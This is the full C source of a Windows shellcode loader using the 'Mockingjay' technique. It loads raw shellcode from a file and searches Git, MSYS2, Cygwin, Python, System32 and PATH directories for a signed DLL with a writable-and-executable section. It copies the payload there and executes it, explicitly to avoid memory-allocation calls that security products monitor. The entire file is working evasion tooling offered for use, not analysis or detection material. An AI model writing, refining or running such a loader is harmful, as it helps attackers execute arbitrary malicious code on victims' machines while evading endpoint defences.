/*
 * Mockingjay loader (x64, MSVC) - Iteration 2 (reviewed)
 *
 * Reads raw shellcode from argv[1], locates a signed DLL that ships with an
 * RWX image section (on-disk IMAGE_SECTION_HEADER characteristics include
 * EXECUTE|WRITE), confirms the runtime mapping is writable+executable via
 * VirtualQuery, memcpy's the shellcode into that section, flushes the
 * instruction cache, and transfers control via a typed function pointer.
 *
 * No VirtualAlloc / VirtualProtect / NtCreateSection is used.
 *
 * Build:
 *   cl /nologo /O2 /GS- /Fe:mockingjay2.exe mockingjay2.c
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp;
    long  size;
    unsigned char *buf;

    *out_size = 0;
    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen('%s') failed (errno=%d)\n", path, errno);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    size = ftell(fp);
    if (size <= 0) {
        fprintf(stderr, "[-] ftell returned %ld\n", size);
        fclose(fp);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }
    buf = (unsigned char *)malloc((size_t)size);
    if (!buf) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)size, fp) != (size_t)size) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)size;
    return buf;
}

/*
 * Mask off protection modifier bits so we can compare the base protection.
 */
static DWORD base_protect(DWORD prot)
{
    return prot & 0xFFu;
}

/*
 * True if the protection grants BOTH write and execute.
 * Accepts PAGE_EXECUTE_READWRITE and PAGE_EXECUTE_WRITECOPY (and the
 * PAGE_WRITECOPY variant which some loaders use for shared pages).
 */
static int is_writable_executable(DWORD raw_prot)
{
    DWORD p = base_protect(raw_prot);

    if (p == PAGE_EXECUTE_READWRITE)      return 1;
    if (p == PAGE_EXECUTE_WRITECOPY)      return 1;
    if (p == (PAGE_EXECUTE_WRITECOPY | PAGE_WRITECOPY)) return 1;
    return 0;
}

/*
 * Stage 1: parse the in-memory PE section headers and return the first
 * section whose Characteristics include EXECUTE|WRITE|READ and whose
 * virtual size is >= min_size.
 */
static PIMAGE_SECTION_HEADER find_rwx_section_header(HMODULE mod,
                                                     SIZE_T min_size,
                                                     SIZE_T *out_vsize)
{
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i, nsec;

    *out_vsize = 0;
    if (!base) return NULL;

    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    sec  = IMAGE_FIRST_SECTION(nt);
    nsec = nt->FileHeader.NumberOfSections;

    for (i = 0; i < nsec; i++, sec++) {
        DWORD ch = sec->Characteristics;
        SIZE_T vsize;

        if ((ch & IMAGE_SCN_MEM_EXECUTE) == 0) continue;
        if ((ch & IMAGE_SCN_MEM_WRITE)   == 0) continue;
        if ((ch & IMAGE_SCN_MEM_READ)    == 0) continue;

        vsize = sec->Misc.VirtualSize;
        if (vsize == 0) vsize = sec->SizeOfRawData;

        if (vsize >= min_size) {
            *out_vsize = vsize;
            return sec;
        }
    }
    return NULL;
}

/*
 * Stage 2: verify at runtime that the region containing the section base is
 * actually mapped writable+executable.
 */
static unsigned char *confirm_runtime_rwx(BYTE *section_base,
                                          SIZE_T min_size,
                                          SIZE_T *out_region_size)
{
    MEMORY_BASIC_INFORMATION mbi;

    *out_region_size = 0;
    if (!section_base) return NULL;

    if (VirtualQuery(section_base, &mbi, sizeof(mbi)) != sizeof(mbi))
        return NULL;

    if (mbi.State != MEM_COMMIT) return NULL;
    if (!is_writable_executable(mbi.Protect)) return NULL;
    if (mbi.RegionSize < min_size) return NULL;

    if ((BYTE *)mbi.BaseAddress + mbi.RegionSize < section_base)
        return NULL;

    *out_region_size = mbi.RegionSize;
    return (unsigned char *)mbi.BaseAddress;
}

/*
 * Try to load `path` and return a writable+executable region of at least
 * min_size bytes that lies within a section declared EXECUTE|WRITE in the
 * PE headers. On success sets *out_mod, *out_addr, *out_size.
 */
static int try_candidate(const char *path,
                         SIZE_T min_size,
                         HMODULE *out_mod,
                         unsigned char **out_addr,
                         SIZE_T *out_size)
{
    HMODULE mod;
    PIMAGE_SECTION_HEADER sec;
    BYTE *section_base;
    SIZE_T vsize;
    unsigned char *region;
    SIZE_T region_size;

    *out_mod  = NULL;
    *out_addr = NULL;
    *out_size = 0;

    mod = LoadLibraryA(path);
    if (!mod) {
        return 0;
    }

    sec = find_rwx_section_header(mod, min_size, &vsize);
    if (!sec) {
        FreeLibrary(mod);
        return 0;
    }

    section_base = (BYTE *)mod + sec->VirtualAddress;

    region = confirm_runtime_rwx(section_base, min_size, &region_size);
    if (!region) {
        printf("[*] %s: section '%.8s' is EXEC|WRITE on disk but runtime "
               "protection is not writable+executable; skipping\n",
               path, sec->Name);
        FreeLibrary(mod);
        return 0;
    }

    printf("[+] Candidate: %s\n", path);
    printf("    section '%.8s'  VA=0x%08lx  vsize=%zu  region=%p  size=0x%zx\n",
           sec->Name, (unsigned long)sec->VirtualAddress,
           (size_t)vsize, (void *)region, (size_t)region_size);

    *out_mod  = mod;
    *out_addr = section_base;
    *out_size = vsize;
    return 1;
}

/*
 * Scan a single directory for *.dll and try each candidate.
 */
static int scan_directory(const char *dir,
                          SIZE_T min_size,
                          HMODULE *out_mod,
                          unsigned char **out_addr,
                          SIZE_T *out_size)
{
    char pattern[MAX_PATH * 2];
    WIN32_FIND_DATAA fd;
    HANDLE h;

    if (snprintf(pattern, sizeof(pattern), "%s\\*.dll", dir) < 0)
        return 0;

    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    do {
        char full[MAX_PATH * 2];

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        if (snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName) < 0)
            continue;

        if (try_candidate(full, min_size, out_mod, out_addr, out_size)) {
            FindClose(h);
            return 1;
        }
    } while (FindNextFileA(h, &fd));

    FindClose(h);
    return 0;
}

/*
 * Enumerate the *parent install directories* of the well-known toolchains
 * that ship DLLs with an RWX image section (MSYS2/Cygwin, Git for Windows,
 * CPython). We do NOT pin a specific version or a specific DLL name: we
 * walk each install root's bin/ subdirectory and let scan_directory pick
 * whichever DLL actually has the RWX section.
 *
 * This replaces the previous version-pinned list (python312.dll, etc.).
 */
static int try_known_install_roots(SIZE_T min_size,
                                   HMODULE *out_mod,
                                   unsigned char **out_addr,
                                   SIZE_T *out_size)
{
    /*
     * Each entry is an install ROOT (not a bin dir, not a versioned path).
     * We probe both "<root>" and "<root>\bin" so that Git-for-Windows
     * (usr\bin, mingw64\bin), MSYS2, Cygwin, and CPython are all covered
     * without hardcoding versions.
     */
    static const char *roots[] = {
        "C:\\Program Files\\Git",
        "C:\\Program Files (x86)\\Git",
        "C:\\msys64",
        "C:\\cygwin64",
        "C:\\cygwin",
        "C:\\Program Files\\Python",
        "C:\\Program Files (x86)\\Python",
        "C:\\Python",
        NULL
    };

    /* Sub-paths under each root that commonly contain the RWX-bearing DLLs. */
    static const char *subdirs[] = {
        "",
        "bin",
        "usr\\bin",
        "mingw64\\bin",
        "mingw32\\bin",
        NULL
    };

    int i, j;

    for (i = 0; roots[i]; i++) {
        for (j = 0; subdirs[j]; j++) {
            char full[MAX_PATH * 2];
            DWORD attr;

            if (subdirs[j][0] == '\0')
                _snprintf_s(full, sizeof(full), _TRUNCATE, "%s", roots[i]);
            else
                _snprintf_s(full, sizeof(full), _TRUNCATE,
                            "%s\\%s", roots[i], subdirs[j]);

            attr = GetFileAttributesA(full);
            if (attr == INVALID_FILE_ATTRIBUTES) continue;
            if (!(attr & FILE_ATTRIBUTE_DIRECTORY)) continue;

            printf("[*] Probing %s\n", full);
            if (scan_directory(full, min_size, out_mod, out_addr, out_size))
                return 1;
        }
    }
    return 0;
}

/*
 * Fallback: scan System32 and every directory on %PATH%.
 */
static int scan_system32_and_path(SIZE_T min_size,
                                  HMODULE *out_mod,
                                  unsigned char **out_addr,
                                  SIZE_T *out_size)
{
    char sysdir[MAX_PATH];
    char *path_env;
    int found = 0;

    if (GetSystemDirectoryA(sysdir, MAX_PATH)) {
        printf("[*] Scanning %s\n", sysdir);
        if (scan_directory(sysdir, min_size, out_mod, out_addr, out_size))
            return 1;
    }

    path_env = getenv("PATH");
    if (!path_env) return 0;

    {
        size_t plen = strlen(path_env);
        char *copy = (char *)malloc(plen + 1);
        char *ctx = NULL;
        char *tok;

        if (!copy) return 0;
        memcpy(copy, path_env, plen + 1);

        tok = strtok_s(copy, ";", &ctx);
        while (tok) {
            if (tok[0] != '\0') {
                printf("[*] Scanning %s\n", tok);
                if (scan_directory(tok, min_size, out_mod, out_addr, out_size)) {
                    found = 1;
                    break;
                }
            }
            tok = strtok_s(NULL, ";", &ctx);
        }
        free(copy);
    }
    return found;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *shellcode;
    size_t         shellcode_size;
    HMODULE        host_mod;
    unsigned char *rwx_addr;
    SIZE_T         rwx_size;
    void         (*exec_fn)(void);

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    shellcode = read_file(argv[1], &shellcode_size);
    if (!shellcode) return 1;

    printf("[+] Loaded %zu bytes of shellcode from %s\n",
           shellcode_size, argv[1]);

    if (shellcode_size < 16) {
        fprintf(stderr, "[-] shellcode too small (%zu bytes)\n", shellcode_size);
        free(shellcode);
        return 1;
    }

    /* Sanity: warn if this looks like a PE (this loader runs raw PIC). */
    if (shellcode_size >= 2 && shellcode[0] == 'M' && shellcode[1] == 'Z') {
        fprintf(stderr, "[-] argv[1] looks like a PE image; this loader "
                        "executes raw PIC shellcode only.\n");
        free(shellcode);
        return 1;
    }

    host_mod = NULL;
    rwx_addr = NULL;
    rwx_size = 0;

    /* Fast path: known install roots (Git / MSYS2 / Cygwin / Python),
     * version-agnostic. */
    if (!try_known_install_roots(shellcode_size,
                                 &host_mod, &rwx_addr, &rwx_size)) {
        /* Fallback: System32 + %PATH% scan. */
        if (!scan_system32_and_path(shellcode_size,
                                    &host_mod, &rwx_addr, &rwx_size)) {
            fprintf(stderr,
                    "[-] No DLL with an RWX image section >= %zu bytes found.\n"
                    "    Mockingjay requires a DLL built with an RWX section\n"
                    "    (e.g. msys-2.0.dll from Git-for-Windows / MSYS2).\n"
                    "    Refusing to fall back to VirtualAlloc/VirtualProtect.\n",
                    shellcode_size);
            free(shellcode);
            return 4;
        }
    }

    if (shellcode_size > (size_t)rwx_size) {
        fprintf(stderr, "[-] shellcode (%zu) larger than section (%zu)\n",
                shellcode_size, (size_t)rwx_size);
        free(shellcode);
        return 3;
    }

    /* Write shellcode into the already-RWX image section. */
    memcpy(rwx_addr, shellcode, shellcode_size);
    FlushInstructionCache(GetCurrentProcess(), rwx_addr, shellcode_size);

    printf("[+] Shellcode copied to %p (%zu bytes)\n",
           (void *)rwx_addr, shellcode_size);

    free(shellcode);

    exec_fn = (void (*)(void))rwx_addr;

    printf("[+] Jumping to payload...\n");
    fflush(stdout);

    exec_fn();

    /* Keep the host DLL resident if the payload returns. */
    (void)host_mod;
    return 0;
}